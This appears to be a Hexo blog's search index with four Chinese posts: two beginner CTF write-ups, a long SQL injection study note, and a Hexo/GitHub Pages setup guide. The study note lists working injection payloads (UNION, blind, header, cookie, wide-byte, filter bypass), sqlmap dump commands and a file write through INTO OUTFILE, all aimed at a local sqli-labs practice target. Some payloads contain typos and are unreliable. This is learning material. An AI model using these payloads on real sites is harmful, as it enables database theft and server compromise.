<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>就差一把钥匙</title>
      <link href="/categories/WriteUp/%E5%B0%B1%E5%B7%AE%E4%B8%80%E6%8A%8A%E9%92%A5%E5%8C%99/"/>
      <url>/categories/WriteUp/%E5%B0%B1%E5%B7%AE%E4%B8%80%E6%8A%8A%E9%92%A5%E5%8C%99/</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.hetianlab.com/expc.do?ce=b67a6b78-4bb5-4446-b123-ec150d745093" target="_blank" rel="noopener">合天网安实验室靶场：就差一把钥匙</a></p><p>难度：初级</p><a id="more"></a><p>nmap嗅探，得到robots.txt,访问之</p><p><img src="1589039744189.png" alt="1589039744189"></p><p><img src="1589039820913.png" alt="1589039820913"></p><p>再访问console/</p><p><img src="1589039627734.png" alt="1589039627734"></p><p>添加x-forwarded-for: 127.0.0.1,篡改数据后send</p><p><img src="1589039550010.png" alt="1589039550010"></p><p>get flag!</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> CTF-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>神奇的磁带</title>
      <link href="/categories/WriteUp/%E7%A5%9E%E5%A5%87%E7%9A%84%E7%A3%81%E5%B8%A6/"/>
      <url>/categories/WriteUp/%E7%A5%9E%E5%A5%87%E7%9A%84%E7%A3%81%E5%B8%A6/</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.hetianlab.com/expc.do?ce=367e590e-6019-4673-ad94-2245c3574aff" target="_blank" rel="noopener">合天网安实验室靶场：神奇的磁带</a></p><p>难度：初级</p><a id="more"></a><p>这是一个套娃,下面开始蛇皮~</p><p>浏览器访问</p><p><img src="1589023144205.png" alt="1589023144205"></p><p>burp抓包，cookie值base64解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#解密</span></span><br><span class="line"><span class="built_in">echo</span> cTEyMzQ1Njc4OTBwLi4= | base64 -d</span><br><span class="line"><span class="comment">#加密</span></span><br><span class="line"><span class="built_in">echo</span> q1234567890p.. | base64</span><br></pre></td></tr></table></figure><p>提交解密后的值</p><p><img src="1589024250067.png" alt="1589024250067"></p><p>告诉我们要提交磁带的英文tape</p><p><img src="1589024264591.png" alt="1589024264591"></p><p>给了个txt文件地址，访问之</p><p><img src="1589023759850.png" alt="1589023759850"></p><p>提交btzhy</p><p><img src="1589024278213.png" alt="1589024278213"></p><p>给了个php页面，访问之</p><p><img src="1589023863272.png" alt="1589023863272"></p><p><img src="1589023887635.png" alt="1589023887635"></p><p>看源码，提示密码两位，生成字典，burp爆破模块，爆破之</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 2 2 <span class="string">"0123456789"</span> &gt; pwd.txt</span><br></pre></td></tr></table></figure><p>比较响应长度，确认为66</p><p>提交，get flag!</p><p><img src="1589024100690.png" alt="1589024100690"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> CTF-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/categories/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/categories/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>sql注入原理和sqli靶场</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>定义：</p><p>服务端的sql语句被恶意修改并成功执行的行为。</p><p>原理：</p><p>客户端向服务端发送数据，服务端未严格校验客户端发送数据（sql语言是解释型语言）</p><p>产生具体原因：</p><ul><li>代码对sql语句的参数过滤不严格</li><li>未启用框架的安全配置，如php的gpc</li><li>未使用安全框架的查询方法，如对应开发语言的安全框架的查询接口</li><li>测试接口未删除</li><li>未启用防火墙</li><li>未启用其他安全防护设备</li></ul><p>业务场景：</p><p>所有与数据库产生交互的地方都有可能</p><ul><li>登录功能</li><li>搜索功能</li><li>详情页</li><li>商品购买</li><li>…</li></ul><p>漏洞危害：</p><ul><li>数据库信息泄露</li><li>网页篡改</li><li>网站被挂马，传播恶意软件</li><li>数据库被恶意操作</li><li>服务器被远程控制，被安装后门</li></ul><p>不同人的看法：</p><ul><li>研发人员：这不是bug,不要耽误我的开发进度</li><li>运维人员：研发怎么回事？</li><li>产品经理：研发怎么回事？</li><li>安全人员：这研发一点安全意识都没有</li><li>吃瓜群众：真香（看热闹），？？？说的啥</li></ul><p>步骤：</p><ol><li><p>判断是否有注入（是否严格校验）<br>(1).可控参数改变能否影响页面显示<br>(2).输入了sql语句是否能报错（报错可看到数据库的一些语句痕迹，不报错可判断我们的语句是否成功闭合）</p></li><li><p>什么类型的注入</p></li><li><p>语句能否被恶意篡改</p></li><li><p>是否能成功执行</p></li><li><p>获取数据</p></li></ol><p>mysql数据库库结构：默认mysql和infomation_schema数据库<br>infomatino_schema内的schemata表存有所有库名；tables表中的所有表名；columns表内存有所有字段名。<br>数据库-&gt;表-&gt;字段-&gt;值</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>返回类型：get和post</p><p>数据类型：整型，字符型</p><p>其他类型：…</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>布尔，时间（sleep,benchmark）</p><p>burpsuite工具链接：<a href="https://pan.baidu.com/s/1pCEyXH5mkD2RojXk7DvXdA" target="_blank" rel="noopener">https://pan.baidu.com/s/1pCEyXH5mkD2RojXk7DvXdA</a><br>提取码：1mbb<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p><p><a href="https://www.cnblogs.com/tynam/p/10089111.html" target="_blank" rel="noopener">破解参考博客</a></p><p><a href="https://www.cnblogs.com/nieliangcai/p/6689915.html" target="_blank" rel="noopener">burpsuite使用参考博客</a></p><h3 id="get基于报错的注入"><a href="#get基于报错的注入" class="headerlink" title="get基于报错的注入"></a>get基于报错的注入</h3><p><strong>Less-1:</strong><br>‘’1’’ LIMIT 0,1’<br>‘1’’ LIMIT 0,1<br>sql: select password,a from admain where id=’’ LIMIT 0,1</p><p><code>手工注入：</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sqli/Less-1/?id=1' order by 3  --+ ✔判断字段数</span><br><span class="line">联合查询：</span><br><span class="line">127.0.0.1/sqli/Less-1/?id=0' UNION SELECT 1,user(),database() --+✔123占位</span><br><span class="line"></span><br><span class="line">127.0.0.1/sqli/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ #✔获取表名</span><br><span class="line"></span><br><span class="line">127.0.0.1/sqli/Less-1/?id=0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+ #✔获取字段名</span><br><span class="line"></span><br><span class="line">127.0.0.1/sqli/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users--+ #✔获取字段值</span><br></pre></td></tr></table></figure><blockquote><p>解读： 0x3a为 ”:“</p></blockquote><p><code>sqlmap:</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" --dbs --batch</span><br><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security --tables --batch</span><br><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security -T users --columns --batch</span><br><span class="line"><span class="meta">#</span><span class="bash">下面(<span class="string">''</span>是错的，要用<span class="string">""</span>或无引号，如下)</span></span><br><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security -T users -C "password,username" --dump --batch</span><br><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-1/?id=1" -D security -T users -C password,username --dump --batch</span><br></pre></td></tr></table></figure><p><strong>Less-2:</strong><br>‘’ LIMIT 0,1’<br>‘ LIMIT 0,1<br>sql: select * from admain where id=1 limit 0,1</p><p><strong>Less-3：</strong><br>‘’1&#39;) LIMIT 0,1’<br>‘1&#39;) LIMIT 0,1<br>sql: select * from admain where id = (‘1’) limit 0,1</p><p><strong>Less-4:</strong><br>‘“1&quot;) LIMIT 0,1’<br>“1&quot;) LIMIT 0,1<br>sql: select * from  admain where id=(“1”) limit 0,1</p><h3 id="get盲注："><a href="#get盲注：" class="headerlink" title="get盲注："></a>get盲注：</h3><h4 id="基于时间的盲注："><a href="#基于时间的盲注：" class="headerlink" title="基于时间的盲注："></a>基于时间的盲注：</h4><p><strong>Less-9:</strong></p><p>127.0.0.1/sqli/Less-9/?id=1” and if(ascii(stustr(database(),1,1))=115,1,sleep(3)) –+</p><p><strong>Less-10:</strong></p><p>127.0.0.1/sqli/Less-10/?id=1” and if(ascii(stustr(database(),1,1))=115,1,sleep(3)) –+</p><h4 id="基于boolean的盲注："><a href="#基于boolean的盲注：" class="headerlink" title="基于boolean的盲注："></a>基于boolean的盲注：</h4><p><strong>less-8</strong>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/sqli/Less-8/?id=1' and length(database())=8 --+</span><br><span class="line"><span class="meta">#</span><span class="bash">可接在 and 后</span></span><br><span class="line">stustr(database(),1,1)</span><br><span class="line">asciii(stustr(database(),1,1))=N</span><br></pre></td></tr></table></figure><p><code>sqlmap:</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "注入点" --technique T --dbs</span><br></pre></td></tr></table></figure><blockquote><p>注解： T 基于时间 （sqlmap -h/hh 查询详细）</p><p>Techniques:<br> These options can be used to tweak testing of specific SQL     injection<br> techniques</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--technique=TECH    SQL injection techniques to use (default "BEUSTQ")</span><br></pre></td></tr></table></figure><p>B: Boolean-based blind SQL injection（布尔型注入）<br>E: Error-based SQL injection（报错型注入）<br>U: UNION query SQL injection（可联合查询注入）<br>S: Stacked queries SQL injection（可多语句查询注入）<br>T: Time-based blind SQL injection（基于时间延迟注入）</p><p>默认情况下会测试所有的方式，可选择</p></blockquote><h3 id="mysql读写文件："><a href="#mysql读写文件：" class="headerlink" title="mysql读写文件："></a>mysql读写文件：</h3><p>读：</p><blockquote><p>前提：show global variables like “secure_file_priv”;</p><p><img src="mysqld_secure_file_priv.png" alt=""></p><p>修改my.ini </p><p><img src="null.png" alt=""></p><p><img src="null_no.png" alt=""></p><p>重启phpstudy.</p><p>select load_file(“f:\1.txt”)；</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,load_file(f:www\\Less-7\\flag.txt),3 --+</span><br></pre></td></tr></table></figure><p>写：</p><blockquote><p>前提：show variables like ‘%general%’;</p><p><img src="write-1.png" alt=""></p><p>查看其general_log 是否为 OFF。</p><p>若是，则修改为 on 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; on;</span><br></pre></td></tr></table></figure><p><img src="write_yes.png" alt=""></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select 1,&#39;&lt;?php phpinfo();?&gt;&#39;,3 into outfile &quot;f:www\\Less-7\\1.php&quot; --+</span><br><span class="line"></span><br><span class="line">127.0.0.1\Less-7\1.php #查看是否写入成功</span><br></pre></td></tr></table></figure><p><code>sqlmap:</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -hh</span><br><span class="line">sqlmap -u "注入点" --file-read "文件路经"</span><br><span class="line">4444 --file-write</span><br><span class="line">4444 --file-dest</span><br></pre></td></tr></table></figure><h3 id="post-基于报错"><a href="#post-基于报错" class="headerlink" title="post 基于报错"></a>post 基于报错</h3><blockquote><p>get与post的区别:注入点发生改变，post 无法在浏览器中查看与修改，但是可以用插件。</p></blockquote><p><code>burpsuite</code></p><p>burpsuite 抓取http数据包保存在文件中</p><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 文件路径 -p 指定探测参数</span><br></pre></td></tr></table></figure><h3 id="get报错注入-未完善"><a href="#get报错注入-未完善" class="headerlink" title="get报错注入(未完善)"></a>get报错注入(未完善)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)</span><br></pre></td></tr></table></figure><blockquote><p>注解： 011011</p></blockquote><h3 id="sql注入绕过"><a href="#sql注入绕过" class="headerlink" title="sql注入绕过"></a>sql注入绕过</h3><p>大小写，编码，关键字屏蔽，内联注释</p><h3 id="post-基于时间和布尔值的盲注"><a href="#post-基于时间和布尔值的盲注" class="headerlink" title="post 基于时间和布尔值的盲注"></a>post 基于时间和布尔值的盲注</h3><p><code>burpsuite</code>抓取http报文</p><p>时间：… and (select (if (lenght (datebase() )&gt; 5,sleep(5),null))) –+ </p><p>布尔：… and (lenght (database() )&gt;5) –+</p><p><code>sqlmap</code> </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">时间 ： sqlmap -r "文件路径" -p  参数   --technique T </span><br><span class="line">布尔：   sqlmap -r "文件路径" -p  参数   --technique B</span><br></pre></td></tr></table></figure><h3 id="http头中的注入"><a href="#http头中的注入" class="headerlink" title="http头中的注入"></a>http头中的注入</h3><p>在user-agent 和 referer 未被屏蔽时，可以进行注入</p><p><code>burpsuite</code></p><p>user-agent: </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and updatexml(1,concat(0x7e,version(),0x7e),1) or '1'='1</span><br></pre></td></tr></table></figure><p>referer:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (length(datebase())&gt;8) or if (1=1,sleep(5),null) or '1'='1</span><br></pre></td></tr></table></figure><h3 id="post-update语句的注入"><a href="#post-update语句的注入" class="headerlink" title="post_update语句的注入"></a>post_update语句的注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,version(),0x7e),1)</span><br></pre></td></tr></table></figure><blockquote><p>注解： 1报错，执行”concat(0x7e,version(),0x7e)”做sql语句，替换报错内容，在报错中执行，最后输出。</p></blockquote><p>updatexml和extractvalue函数</p><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>例：less-20</p><p><code>burpsuite</code></p><p>抓取，用” \ “判断闭合符号，之后 and 1=1,或 and \ or 加sql语句</p><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r "target.txt" --level 3 --batch </span><br><span class="line">sqlmap.py -r "target.txt" --level 3 --batch --dbs</span><br><span class="line">sqlmap.py -r "target.txt" --level 3 --batch -D security --tables</span><br><span class="line">sqlmap.py -r "target.txt" --level 3 --batch -D security -T users --columns </span><br><span class="line">sqlmap.py -r "target.txt" --level 3 --batch -D security -T users -C password,username --dump</span><br></pre></td></tr></table></figure><h3 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h3><p><code>burpsuite</code></p><p>首先截取，decoder 进行加密，例如：admin\ base64加密后为：YWRtaW5c</p><p>进行报错。</p><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r "target.txt" --level 3 --batch --tamper base64encode.py</span><br></pre></td></tr></table></figure><h3 id="绕过去除注释的sql注入"><a href="#绕过去除注释的sql注入" class="headerlink" title="绕过去除注释的sql注入"></a>绕过去除注释的sql注入</h3><p>注释符：  –+   –空格    #   /* 多行注释 */</p><p>preg_replace()函数来替换字符串或字符数组的莫些字符</p><p>例：less-23:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="string">'3</span></span><br></pre></td></tr></table></figure><p> 注解：-1使前面的失效，union select 语句有效，-1和3旁边的单引号为一对，自动补充的单引号会加在最后，最后完成闭合。</p><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-23/?id=1" --batch --dbs</span><br></pre></td></tr></table></figure><p>…</p><h3 id="绕过去除and-or-的sql注入"><a href="#绕过去除and-or-的sql注入" class="headerlink" title="绕过去除and or 的sql注入"></a>绕过去除and or 的sql注入</h3><p>preg_replace()函数来替换字符串或字符数组的莫些字符</p><p>双写，内含注释，符号 （例：oorr,an/**/d,&amp;&amp;,||)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-25/?id=1" --batch --dbs</span><br></pre></td></tr></table></figure><h3 id="绕过去除空格的sql注入"><a href="#绕过去除空格的sql注入" class="headerlink" title="绕过去除空格的sql注入"></a>绕过去除空格的sql注入</h3><p>%09 :Tab </p><p>%0a ：换行</p><p>%20 ：空格 </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-27/?id=100000000%27%09unIOn%09seLEct%091,version(),3%09||%09%271</span><br></pre></td></tr></table></figure><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-27/?id=1" --batch --dbs</span><br></pre></td></tr></table></figure><h3 id="宽字节的注入"><a href="#宽字节的注入" class="headerlink" title="宽字节的注入"></a>宽字节的注入</h3><p>原理： GBK ：宽字节字符集的一种，Mysql默认字符集,</p><p>GBK占二字节，ASCII占一字节</p><p>php中编码为GBK，函数执行添加的是ASCII编码</p><p>%DF (常用)：会被php 中的addslashes 函数转义为” %DF\‘ “ ， 如果网站，mysql编码都为GBK，那么就会被转义为”%DF%5C%27”，”%DF%5C”其为一个宽字符，也就是“縗”。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-33/?id=-1%df%27%20union%20select%201,version(),database()--+</span><br></pre></td></tr></table></figure><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-33/?id=1%df%27" --search --level 3 --risk 1 --thread 10</span><br></pre></td></tr></table></figure><p>其实，首字节ascii大于128，如129十进制转十六进制为0x81,然后写%81即可；</p><p>GBK 首字节对应(0x81-0xFE),尾字节对应 0x40-0xFE (0x7F除外)。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-32/?id=-1%81%27%20%20union%20select%201,2,3--+</span><br></pre></td></tr></table></figure><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-32/?id=1" --tamper=unmagicquotes.py</span><br></pre></td></tr></table></figure><h3 id="Access偏移注入"><a href="#Access偏移注入" class="headerlink" title="Access偏移注入"></a>Access偏移注入</h3><p>公式：</p><p>工具：owasp-zap</p><p>access:小型数据库，只存在一个库，库内多个表。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建</title>
      <link href="/categories/%E8%8F%9C%E9%B8%9F%E4%BA%92%E5%8A%A9/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/categories/%E8%8F%9C%E9%B8%9F%E4%BA%92%E5%8A%A9/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>Hexo + Github 搭建 Blog 和 每次博客的部署</p><hr><a id="more"></a><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>1.安装git</p><p>git下载地址：<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">链接</a><br>安装后验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git --version</span><br></pre></td></tr></table></figure><p>出现类似下面的版本号，皆为成功<br>git version 2.19.2.windows.1</p><p>2.安装node（其附带npm）</p><p>node.js下载地址：<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">链接</a><br>安装后验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ node -v</span><br></pre></td></tr></table></figure><p>出现类似下面的版本号(安装最新版本)：<br>v10.14.1</p><p>3.安装Hexo<br>命令行输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>4.创建本地运行库</p><p>创建本地仓库文件夹：例F:\github<br>右键点击该文件夹，Git Bash Here，命令行输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init myblog</span><br></pre></td></tr></table></figure><p>初始化完成！</p><h2 id="本地试运行"><a href="#本地试运行" class="headerlink" title="本地试运行"></a>本地试运行</h2><p>1.进入博客根目录（myblog）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> myblog</span><br></pre></td></tr></table></figure><p>2.安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure><p>3.运行<br>本地运行(如果4000端口被占用，使用 hexo service -p 5000 修改端口)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>此时在浏览器输入 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> ,访问到博客界面 </p><h2 id="部署在远程库"><a href="#部署在远程库" class="headerlink" title="部署在远程库"></a>部署在远程库</h2><p>这里将其部署在github上</p><p>1.创建Github账户</p><p>略，随便百度一下</p><p>2.创建github项目</p><p>创建一个名为yourname.github.io的项目（yourname为你github名）</p><p>3.生成密钥，用于ssh连接</p><p>在本地，右键网站根目录，点击Git Bash 输入下列命令<br>yourname 即为github注册时的用户名<br>youremail 为注册时的邮箱账号<br>第三条命令生成密钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">"yourname"</span></span><br><span class="line">$ git config --global user.email <span class="string">"yourEmail"</span></span><br><span class="line">$ ssh-keygen -t rsa -C <span class="string">"yourEmail"</span></span><br></pre></td></tr></table></figure><p>此时在C:\Users下你的当前账户文件夹下会有一个 .ssh 文件，找到id_rsa.pub文件，复制里面的内容，粘贴至GitHub中（点击右上角用户头像下的Settings，之后点击左侧的SSH and GPG keys，找到New SSH key点击，输入title，并将之前复制的内容粘贴到下面的key中），最后点击Add SSH key，完成。</p><p>4.修改配置文件</p><p>去博客根目录下的_config.yml文件中，添加如下（yourname就是GitHub的用户名）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo: git@github.com:yourname/yourname.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>5.将本地仓库同步到github</p><p>在第一次生成以及部署之前，需要安装一个扩展：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>清除生成的静态网页缓存数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br></pre></td></tr></table></figure><p>生成文章对应的静态页面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g</span><br></pre></td></tr></table></figure><p>部署本地站点到github命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 菜鸟互助 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
